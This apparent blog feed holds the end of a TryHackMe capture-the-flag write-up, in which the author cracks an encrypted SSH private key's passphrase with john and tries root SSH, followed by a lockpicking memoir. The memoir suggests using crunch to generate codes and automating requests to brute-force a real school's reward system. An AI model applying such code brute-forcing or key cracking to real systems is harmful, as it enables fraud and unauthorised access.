&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The document has moved &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.159.177/secret/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;address&amp;gt;&lt;/span&gt;Apache/2.4.7 (Ubuntu) Server at 10.10.159.177 Port 80&lt;span class=&quot;nt&quot;&gt;&amp;lt;/address&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/nanidog.jpg&quot; height=&quot;200&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lol jk this isn‚Äôt a problem don‚Äôt worry. In fact if you just read, it tells you what to do, we need to add a &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; to the end. Let‚Äôs try it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://10.10.159.177/secret/
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Turtles?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;turtle.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&amp;lt;/html&amp;gt;&lt;/p&gt;

&lt;p&gt;We got a picture of a turtle? let‚Äôs see what it is :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/secret/turtle.png &amp;gt; turtle.png
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload  Upload   Total   Spent    Left  Speed
100 72384  100 72384    0     0   450k      0 --:--:-- --:--:-- --:--:--  450k
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yea we can just look at it in our browser, but 1. it‚Äôs useful to know how to use curl/wget and 2. we wanna download it anyway to check for anything hidden :)&lt;/p&gt;

&lt;p&gt;So, here is the image:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/turtle.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So although it looks fine, it‚Äôs still probably worth checking it for some basic steg stuff.&lt;/p&gt;

&lt;h4 id=&quot;exiftool&quot;&gt;Exiftool&lt;/h4&gt;

&lt;p&gt;Exiftool allows the user to view an image‚Äôs exif metadata. This can include comments, GPS co-ordinates, and a lot of other information&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ exiftool turtle.png 
ExifTool Version Number         : 11.88
File Name                       : turtle.png
Directory                       : .
File Size                       : 71 kB
File Modification Date/Time     : 2020:11:07 22:38:45+00:00
File Access Date/Time           : 2020:11:07 22:54:32+00:00
File Inode Change Date/Time     : 2020:11:07 22:38:45+00:00
File Permissions                : rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 680
Image Height                    : 340
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 680x340
Megapixels                      : 0.231
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Not much interesting here. Let‚Äôs instead try Zsteg&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ zsteg turtle.png 
[=] nothing :( 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are lots of other things that could be tried here, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;stegsolve&lt;/code&gt; and so much more, but that could have an entire blog about it so uh- I‚Äôll save that for another time.&lt;/p&gt;

&lt;h3 id=&quot;backup&quot;&gt;Backup&lt;/h3&gt;
&lt;p&gt;Once again let‚Äôs curl it :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/backup/
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;OWO WHATS THIS&amp;gt;!?! A private RSA key????&lt;/p&gt;

&lt;p&gt;Incase you don‚Äôt know, SSH can be accessed via both a password and a private key. You should never ever ever shhare you‚Äôre private key unless of course you want your system infested with skids. This is awesome, surely finding this could hav saved us so much time. Well, maybe- we can‚Äôt be sure yet. If you look closely you can see that it is actually encrypted. This is okay though :)&lt;/p&gt;

&lt;h4 id=&quot;bruteforcing-with-john&quot;&gt;Bruteforcing with john&lt;/h4&gt;

&lt;p&gt;Okay so john is a password cracking tool. We‚Äôre gonna be using it to peform a dictionary attack against this key in order to try use it :)&lt;/p&gt;

&lt;p&gt;First let‚Äôs save the file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/backup/ &amp;gt; key.rsa
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                            Dload  Upload   Total   Spent    Left  Speed
100  1767  100  1767    0     0  24541      0 --:--:-- --:--:-- --:--:-- 24541
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next let‚Äôs convert it to a readable format for john using SSH2john&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ ~/JohnTheRipper/run/ssh2john.py key.rsa &amp;gt; john.hash
jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ cat john.hash
key.    rsa:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb 6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3a  aafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e   244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d2    6eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e 77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b6822  84a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c61   5721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c27    6056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a7 5def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6  aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9   a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a    7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b75 7aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b  9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1   697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, now we can try to crack it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ john --wordlist=~/Desktop/rockyou.txt john.hash 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Epic, so depending on the speed of your cpu this may take a while. If you have a beefy GPU and are interested in password cracking I encourage you to check out hashcat.&lt;/p&gt;

&lt;p&gt;After a while, we get the password [REDACTED].&lt;/p&gt;

&lt;p&gt;So, let‚Äôs try to use it. But first we need to make sure to correctly set the permissions. We can do either &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 key.rsa&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 400 key.rsa&lt;/code&gt; to do this. So, let‚Äôs SSH. :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ ssh -i key.rsa root@10.10.223.85
Enter passphrase for key 'key.rsa': 
root@10.10.223.85's password:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Damn, so while we did get the password to to ssh private key, the server was configured to also require a password. We could try bruteforcing but I doubt it would work. I‚Äôm also past deadline for this blog so yeah no, not going into that today. Anyways yea, this was just a red herring, a nice extra touch though, well done Ryan!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;So, that‚Äôs it for this one :)&lt;/p&gt;

&lt;p&gt;If you spotted any spelling mistakes, please make a PR with all of the mistakes in that PR fixed to the git repo :). If you made it this far- why‚Ä¶ do you have so much time??&lt;/p&gt;

&lt;p&gt;For a much nicer writeup please check out john hammond‚Äôs&lt;/p&gt;

&lt;p&gt;I‚Äôve been thinking about making each writeup a Red vs Blue kinda thing? Where first I show how a realistic penetration test would occur, and then how ideally a response team could well.. respond - and how sysadmins could have prevented it in the first place. Just a lil‚Äô something to spice things up- I see far too many boring asf walkthroughs of boxes.&lt;/p&gt;

&lt;p&gt;Anyways thankyou byeee!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/cutecat.gif&quot; /&gt;&lt;/p&gt;</content><author><name>JamBot</name></author><category term="thm" /><category term="pentesting" /><category term="writeup" /><summary type="html">Explanation</summary></entry><entry><title type="html">Lockpicking adventures</title><link href="http://localhost:4000/blog/lockpicking-adventures" rel="alternate" type="text/html" title="Lockpicking adventures" /><published>2020-10-03T00:00:00+01:00</published><updated>2020-10-03T00:00:00+01:00</updated><id>http://localhost:4000/blog/lockpicking-adventures</id><content type="html" xml:base="http://localhost:4000/blog/lockpicking-adventures">&lt;h2 id=&quot;in-the-beginning&quot;&gt;In the beginning&lt;/h2&gt;

&lt;p&gt;I started picking locks for fun around Year 7- only because my dad did really. We‚Äôd buy, or somehow acquire locks and see how fast we could open them, try out different techniques etc..&lt;/p&gt;

&lt;p&gt;I really enjoyed spending time picking actual locks, it made me feel like a spy in a movie or something, and it was a real practical skill- my interest only grew when a teacher paid me in our school‚Äôs weird point system to open a cabinet with his XBOX in? I think he ran homebrew on it and used it for physics simulations or something idk&lt;/p&gt;

&lt;p&gt;In hindsight that was probably a bad idea as it could have been someone elses, but it was his cabinet and he gave me permission to open it so it was legal &lt;del&gt;also got ¬£20 worth of those points so yknow.&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;Anyways yea, it started out as occasional picking but then uh kinda grew into a mild obsession‚Ä¶ üëÄ&lt;/p&gt;

&lt;video controls=&quot;&quot; width=&quot;320&quot; height=&quot;240&quot;&gt;
    &lt;source src=&quot;https://jambot3000.github.io/assets/videos/VID-20200316-WA0000.mp4&quot; /&gt;
&lt;/video&gt;

&lt;p&gt;Yea so slowly but surely it turned into whatever this is‚Ä¶ &lt;del&gt;(that‚Äôs not even half of the no name padlock collection)&lt;/del&gt; üòî&lt;/p&gt;

&lt;p&gt;Before I knew it i was going to locksmiths, asking for their broken parts, miscelleneous keys, and just in general being a complete weirdo. But hey, I‚Äôm not afraid to look weird if I‚Äôm getting free locks out of it.&lt;/p&gt;

&lt;h2 id=&quot;getting-started&quot;&gt;Getting started&lt;/h2&gt;

&lt;p&gt;I started out picking normal pin tumbler locks purely due to accessibility and price. In the begining I actually wouldn‚Äôt bother looking for locks with specific numbers of pins, and I wouldn‚Äôt care if they had security pins, weird bitting or anything. I just wanted as many locks as possible to get a realistic experience. But if I had to recommend some locks to beginners I‚Äôd definitely say any masterlock you can get your hands on.&lt;/p&gt;

&lt;p&gt;Master locks due to their reputation and recognition are incredibly popular, but despite this, their security features are objectively minimal. They use the same/very similar core in the vast majority of their locks. This doesn‚Äôt mean they are all pinned the same, ofc not- but it does mean if you can pick one, you can probably pick a lot of them..&lt;/p&gt;

&lt;p&gt;It can also just depend on your goal? If you want to learn lockpicking for pentesting purposes, then yea masterlocks and other padlocks are great due to how common they are- but also eurocyclinder locks (these are also normally pin tumbler), as these are the most common household lock in the UK&lt;/p&gt;

&lt;p&gt;They‚Äôre also used &lt;strong&gt;a lot&lt;/strong&gt; in building complexes and offices.&lt;/p&gt;

&lt;p&gt;Tradtional wafer locks as seen on filing cabinets would also be good to practice on. I was lucky enough to be allowed to practice on my old school‚Äôs during science lessons. Most cheap filing cabinets (if they even have locks) are very bad security wise, and it‚Äôs not at all uncommon to see cabinets with 4 pin wafer locks. So if stealing confidential files is in scope on a physical red team op, then go nuts on those cabinets lol.&lt;/p&gt;

&lt;p&gt;Anyways yea, there are lots of different types of locks, brands etc. But my advice for new pickers is just&lt;/p&gt;

&lt;p&gt;-check out other pickers and their adventures. &lt;a href=&quot;https://www.youtube.com/lockpickinglawyer&quot;&gt;lockpicking lawyer&lt;/a&gt; and &lt;a href=&quot;https://www.youtube.com/user/bosnianbill&quot;&gt;bosnianbill&lt;/a&gt; are particularly awesome and much better than me.&lt;/p&gt;

&lt;p&gt;-get as many locks as you can &lt;del&gt;legally&lt;/del&gt;.&lt;/p&gt;

&lt;p&gt;-don‚Äôt splurge on insanely thin, expensive picks that you‚Äôll only break as a newbie.&lt;/p&gt;

&lt;p&gt;-don‚Äôt break the &lt;a href=&quot;https://en.wikipedia.org/wiki/Law_of_the_United_Kingdom&quot;&gt;law&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;some-lock-related-adventures-&quot;&gt;Some lock-related adventures üôÇ&lt;/h2&gt;

&lt;p&gt;Over the past 4 years I‚Äôve had some funny, and not-so-funny stories, here are a few of em :)&lt;/p&gt;

&lt;h2 id=&quot;cool-teachers&quot;&gt;Cool teachers&lt;/h2&gt;

&lt;p&gt;So I‚Äôve went to a few schools, but my first secondary school was probably the best in terms of teachers who were cool about me picking locks in their classes lol.&lt;/p&gt;

&lt;h3 id=&quot;mr-e&quot;&gt;Mr. E&lt;/h3&gt;

&lt;p&gt;I had an epic science teacher Mr.E, he was chill with us doing whatever so long as we done the work he‚Äôd set. Honestly learnt the most in his lessons, pay attention teachers watching lol. I‚Äôd normally pull out some locks and start picking in his lessons, he didn‚Äôt seem to mind, plus I was at the back of the class. But one day we had a new seating plan or something, and I was in a more visible spot- he still didn‚Äôt seem to care and just didn‚Äôt question it. But randomly one lesson he came over and asked me about what I was doing, and well I explained. He asked if I could pick his filing cabinet lock and I said idk maybe. It was a 4 pin(wafer) lock, and didn‚Äôt really take too long to pick. EVentually he actually asked me to recommend him a set of picks to buy because he wanted to get into it. I don‚Äôt go to that school anymore but he was an epic teacher. I found it so cool that a teacher was actually interested in something I do&lt;/p&gt;

&lt;h3 id=&quot;mr-b&quot;&gt;Mr. B&lt;/h3&gt;

&lt;p&gt;So Mr.B was my engineering teacher, or electonics? I don‚Äôt remember. Anyways yea he would also let me pick locks in class- super chill.&lt;/p&gt;

&lt;p&gt;He had a problem, he had a cabinet filled with old stuff, including for some reason an XBOX? I mentioned this before lol. Anyways yea one lunch time he pu,led me into the room and asked me to pick a thing. It took around a minute for me to get in, but I was super nervous. I know it was only a small thing but- this was the first time I ever helped someone with a problem, using a skill that I developed myself. My lockpicking journey up to this point was only a few months long but it‚Äôs such an independant thing. My dad taught me some basics but it‚Äôs quite a ‚Äúgetting the feel to it‚Äù type thing. To me this moment means a lot, I felt cool and was super happy about it. :)&lt;/p&gt;

&lt;p&gt;So, after I got into the lock, he gave me a postcard? My school‚Äôs teachers at the times were given stickers and postcards to hand out to students for good behaviour etc. You could use the points to buy stuff, but what I wanted was to put it onto my lunch card. I was promised 200 merits for this- the eqvuivilent to ¬£20. This was awesome because it meant I could buy 3 pancakes every break and still have enough for a nice lunch!. The point system was quite bad and in hindsight I could have definitely exploited it by generating a list of codes and automating the scoring of them- it had no authentication system if i recall correctly. Post cards were worth the most but used the uppercase alphabet and numbers.&lt;/p&gt;

&lt;p&gt;Hmm. Ig if anyone reading this has a school with a mystickers system they could try. Could always use something like crunch to generate the wordlist- then copy the post request made when you enter a code. If anyone does that feel free to dm lol&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt install crunch;
crunch 6 6 1234567890QWERTYUIOPASDFGHJKLZXCVBNM| tee codelist.txt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second command should generate something like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Crunch will now generate the following amount of data: 15237476352 bytes
14531 MB
14 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 2176782336 
111111
111112
111113
111114
111115
111116

etc..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that ig you could just automate some post requests and bam free pancakes. That was a weird spontaneous rabbit hole lmao sorry. But yeah don‚Äôt do that, as the law exists and what not.&lt;/p&gt;

&lt;p&gt;Huh, didn‚Äôt think I‚Äôd be delving into cyber security stuff in a lockpicking blogpost lmao. Christ I‚Äôm tired it‚Äôs 23:51 rn and I only got 3 hours sleep.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/mr.b.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;TL;DR, I picked a lock for my teacher then for the next to weeks I ate like a kid with ¬£20 and an addiction to pancakes. (probably because that‚Äôs exactly what I was)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;school-heist&quot;&gt;School ‚Äúheist‚Äù&lt;/h2&gt;

&lt;h3 id=&quot;lock-goblinism&quot;&gt;Lock goblinism&lt;/h3&gt;

&lt;p&gt;So uh, I‚Äôve kind of gotten into a habit at this point of seeing a lock, and thinking 2 things:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Can I pick it / Will I be allowed ?&lt;/li&gt;
  &lt;li&gt;Can I have it (with their permission of course)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It‚Äôs super common for people to lose keys, and after people lose their keys they often don‚Äôt have a purpose for a lock. SO I find in these situations it‚Äôs always worth asking. Some may call me a greedy lock goblin, But I ‚Ä¶ don‚Äôt have a comeback to that.üòîüòîüòî&lt;/p&gt;

&lt;p&gt;One of these situations was in my computer science class a while ago. Now, computer science was boring, but I had a supply teacher who made it pretty good, much enthusiasm. This supply teacher owned a padlock, enthasis on the &lt;strong&gt;&lt;em&gt;owned.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;rise-of-the-goblin&quot;&gt;Rise of the goblin&lt;/h3&gt;

&lt;p&gt;Anyways yea, I joked about picking it for a while and I suppose he thought nothing of it. But one of those times he encouraged me to, so I pulled out a small set of picks from my wallet, and got up. I think he was suprised &lt;del&gt;I wonder why&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;So yea I got shut down the first time, but later to the end of the lesson I pleaded my case and essentially gave a Tedtalk on why I should own that lock and how it is against my human rights to keep it out of my hands.&lt;/p&gt;

&lt;p&gt;I don‚Äôt think he expected me to get it, the first time I picked it, it took me around 2 minutes, and he had already left the room. I still wanted to let him know I did so, uhh, I left a note.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/stealed.jpg&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fall-of-the-goblin&quot;&gt;Fall of the goblin&lt;/h3&gt;

&lt;p&gt;The next time I had a class with him, naturally I ask if I can keep it and he said if I can pick it then yea-&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/Pogchamp.png&quot; height=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But! For whatever reason I wasn‚Äôt able to get it, I think I forgot and it was half term or something idk. And for a while I actually forgot about this lock, and the teacher had left.&lt;/p&gt;

&lt;p&gt;Recently, the whole uh &lt;a href=&quot;https://en.wikipedia.org/wiki/Coronavirus&quot;&gt;global pandemic&lt;/a&gt; thing happened, and we had to go home for a while. Towards the end, I remembered this lock. I had to have it. I needed it. I couldn‚Äôt bare the thought of it being outside of my lockbox.&lt;/p&gt;

&lt;p&gt;(lol going back through some of these as I‚Äôm redesigning the blog this seemed kinda creepy but it was supposed to be a joke, what was I thinking lmao)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/videos/golem.gif&quot; height=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;goblin-rebirth&quot;&gt;Goblin: rebirth&lt;/h3&gt;

&lt;p&gt;So, the teacher had left. This was established as my lock now. No one else had a key or purpose for it. The classroom it was in now belonged to my math teacher, and I figured it would look extremely sketch if I just picked a random lock in his room and took it home. So, I started planning the (legal) ‚Äúheist‚Äù. Due to my timetable and restirctions on where we could go in the building, I had a limmited timeframe of a few minutes. Either I could get to lesson early, or I could try waiting for him to go out in the transition from lesson to break. But I remember it taking me a few minutes to initially pick this lock, so it seemed a bit risky.&lt;/p&gt;

&lt;p&gt;I got to lesson on a monday, to see my teacher walking out of the class to go get something, so with my picks in my bag I rushed towards the door handle that the lock was on, rummaged through my bag to find my picks, and I initially panicked because I thought I wouldn‚Äôt be able to, so I decided not to be delicate and careful and SPP, but instead just rush, rake, and hope I get lucky. And‚Ä¶&lt;/p&gt;

&lt;p&gt;It worked! After a year of waiting I &lt;strong&gt;&lt;em&gt;finally&lt;/em&gt;&lt;/strong&gt; got my lock. This lock had a wide open keyway, so any novice picker could probably get it open, not a lot of skill required for this, but IMO a cool-ish story nonetheless&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/finally.jpg&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;end&quot;&gt;End&lt;/h2&gt;

